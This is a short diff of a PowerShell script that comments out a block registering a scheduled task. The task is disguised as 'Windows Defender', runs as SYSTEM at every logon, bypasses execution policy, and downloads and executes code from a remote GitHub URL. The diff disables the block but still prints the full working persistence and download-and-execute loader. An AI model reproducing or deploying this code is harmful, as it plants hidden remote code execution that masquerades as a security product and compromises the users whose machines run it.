@@ -92,11 +92,11 @@ else
 
     try
     {
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ''https://raw.githubusercontent.com/aodfs/0/main/2'' -UseBasicP).Content"'
-        $trigger = New-ScheduledTaskTrigger -AtLogOn;
-        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
-        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
-        Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
+        #$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument '-NoProfile -ExecutionPolicy Bypass -Command "iex(iwr ''https://raw.githubusercontent.com/aodfs/0/main/2'' -UseBasicP).Content"'
+        #$trigger = New-ScheduledTaskTrigger -AtLogOn;
+        #$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest;
+        #$task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal;
+        #Register-ScheduledTask -TaskName "Windows Defender" -InputObject $task -TaskPath "\Microsoft\Windows\Windows Defender\" -Force;
     }
     catch 
     {
